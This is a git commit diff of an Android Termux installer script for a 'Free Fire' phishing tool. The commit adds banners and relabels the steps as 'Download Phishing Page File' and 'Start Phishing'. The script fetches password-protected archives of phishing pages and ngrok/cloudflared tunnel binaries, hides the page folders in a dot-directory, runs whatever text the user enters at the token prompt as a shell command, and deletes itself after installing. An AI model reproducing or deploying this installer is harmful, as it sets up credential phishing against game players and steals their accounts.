1cc8645ecaa64c6164dbbba9c8f58c5b68ba4c48
SUMAM MONDAL <63942767+Online-Hacking@users.noreply.github.com>
2022-05-31 10:58:56 +0530

    Update Android-Setup.sh

--- OnlineHacking/SUMAN/FreeFire/SM/Files/Android-Setup.sh
+++ OnlineHacking/SUMAN/FreeFire/SM/Files/Android-Setup.sh
@@ -2,6 +2,48 @@
 echo ""
 clear
 echo ""
+
+logo() {
+echo -e ""
+echo -e "\e[33m
+███████ ██████  ███████ ███████ 
+██      ██   ██ ██      ██      
+█████   ██████  █████   █████   
+██      ██   ██ ██      ██      
+██      ██   ██ ███████ ███████                                 
+                                
+      ███████ ██ ██████  ███████      
+      ██      ██ ██   ██ ██           
+      █████   ██ ██████  █████        
+      ██      ██ ██   ██ ██           
+      ██      ██ ██   ██ ███████      
+                                       
+  \e[0m\n"
+}
+
+logo2() {
+echo -e ""
+echo -e "\e[92m 
+         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
+        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
+        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
+        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
+        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
+         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
+                                                            
+     ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
+     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
+     ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
+     ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
+     ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
+     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  \e[95;1m \e[0m\n"
+  echo""
+  
+  }
+  
+
+
+
 echo -e ""
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
@@ -17,15 +59,12 @@ echo ""
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 1 :\e[0m\e[1;36m Play Install & Use Video  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 2 :\e[0m\e[1;36m Enter Activation Key  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 3 :\e[0m\e[1;36m Download Requirement "
-echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Ngrok  "
-echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Tool File  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Link Services  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Phishing Page File  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 6 :\e[0m\e[1;36m Enter The Ngrok Token  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Start Phishing  "
-echo ""
-rm -rf /data/data/com.termux/files/usr/bin/OnlineHacking/logo.sh
-rm -rf /data/data/com.termux/files/usr/bin/OnlineHacking/logo2.sh
-rm -rf /data/data/com.termux/files/usr/bin/FreeFire-Phishing
 sleep 5
+rm -rf /data/data/com.termux/files/usr/bin/FreeFire-Phishing
 clear
 echo ""
 echo ""
@@ -40,28 +79,19 @@ echo ""
 echo -e ""
 echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m How To Install And Use This Tool Play Video \e[0m"
 echo ""
-echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Video Link :\e[0m\e[1;36m https://play.onlinehacking.xyz/v/bINNkn  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Video Link :\e[0m\e[1;36m https://play.onlinehacking.xyz  "
 echo ""
 echo ""
 echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Video Watching Complete ? \e[1;91m (Y/N) : \e[0m' option
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click Enter to continue : \e[0m' option
 echo""
 echo""
-echo""
-if [[ $option == *'N'* ]]; then
-clear
-exit
-fi
-if [[ $option == *'n'* ]]; then
-clear
-exit
-fi
 echo ""
-termux-open-url https://www.onlinehacking.xyz/2021/07/FreeFire-Phishing-Hack-Termux.html
+termux-open-url https://www.onlinehacking.in/
 echo ""
 clear
 echo ""
-echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Free Fire Phishing Tool Please Wait....  \e[0m"
+echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The FREE FIRE MAX Phishing Tool Please Wait....  \e[0m"
 echo -e ""
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
@@ -114,30 +144,58 @@ pkg install gem -y
 gem install lolcat
 clear
 echo""
+logo2
+echo""
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
-echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         Download Link Services         !!\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;93m  !!         Download Link Services         !!\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
 wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok -O ngrok
+echo ""
 wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared-linux-arm64
 echo""
 clear
 echo ""
+logo
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
-echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;96m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
 wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/FreeFire/SM/OH/SUMAN.rar -O SUMAN.rar
+wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/FreeFire/SM/OH/SUMAN-MAX.rar -O SUMAN-MAX.rar
 unrar x -Password SUMAN.rar
+unrar x -Password SUMAN-MAX.rar
 rm -rf SUMAN.rar
+rm -rf SUMAN-MAX.rar
 chmod +x ngrok
 chmod +x cloudflared-linux-arm64
 chmod +x FF
 chmod +x FreeFire
 clear
+
 echo ""
+echo -e "\e[93m 
+ ███▄    █   ▄████  ██▀███   ▒█████   ██ ▄█▀
+ ██ ▀█   █  ██▒ ▀█▒▓██ ▒ ██▒▒██▒  ██▒ ██▄█▒ 
+▓██  ▀█ ██▒▒██░▄▄▄░▓██ ░▄█ ▒▒██░  ██▒▓███▄░ 
+▓██▒  ▐▌██▒░▓█  ██▓▒██▀▀█▄  ▒██   ██░▓██ █▄ 
+▒██░   ▓██░░▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒██▒ █▄
+░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▒ ▓▒
+░ ░░   ░ ▒░  ░   ░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒ ▒░
+   ░   ░ ░ ░ ░   ░   ░░   ░ ░ ░ ░ ▒  ░ ░░ ░ 
+         ░       ░    ░         ░ ░  ░  ░   
+\e[0m\n"
+echo ""
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mToken ? \e[1;91m (y/n) : \e[0m' option
+echo""
+echo""
+echo""
+
+if [[ $option == *'y'* ]]; then
+clear
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
 echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
@@ -147,37 +205,47 @@ echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
 echo ""
 echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
 echo ""
-sleep 1
-echo ""
 read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
 $token
 echo ""
+fi
+if [[ $option == *'n'* ]]; then
+clear
+fi
+
 echo
-cp -R cloudflared-linux-arm64 ngrok SUMAN/1/
-cp -R cloudflared-linux-arm64 ngrok SUMAN/2/
-cp -R cloudflared-linux-arm64 ngrok SUMAN/3/
-cp -R cloudflared-linux-arm64 ngrok SUMAN/4/
-cp -R cloudflared-linux-arm64 ngrok SUMAN/5/
-cp -R cloudflared-linux-arm64 ngrok SUMAN/6/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/1/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/2/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/3/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/4/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/5/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/6/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/7/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/8/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/9/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/0/
 chmod 7777 FreeFire-Phishing
 clear
 echo
 echo
 cp -R ngrok /data/data/com.termux/files/usr/bin
 cp -R cloudflared-linux-arm64 /data/data/com.termux/files/usr/bin
-cp -R SUMAN /data/data/com.termux/files/usr/bin
+cp -R .SUMAN /data/data/com.termux/files/usr/bin
 cp -R FF /data/data/com.termux/files/usr/bin
 cp -R FreeFire /data/data/com.termux/files/usr/bin
 cp -R FreeFire-Phishing /data/data/com.termux/files/usr/bin
 cp -R OnlineHacking /data/data/com.termux/files/usr/bin
 echo
-rm -rf SUMAN 
 echo
-echo -e "\e[35m[+] Connect Online Hacking Free Fire Hacking Server......  \e[m "
-sleep 2
+logo
+echo
+echo -e "\e[35m[+] Connect Online Hacking FREE FIRE Hacking Server (CyberPlane)......  \e[m "
+sleep 5
 echo
 echo
 clear
+logo2
+echo
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
@@ -189,7 +257,9 @@ echo
 echo -e "\e[92m[+] Open New type this command:\e[93m FreeFire-Phishing \e[m "
 echo
 fi
-sleep 3
+
 echo
 rm -rf Android-Setup.sh
+sleep 3
+echo
 exit
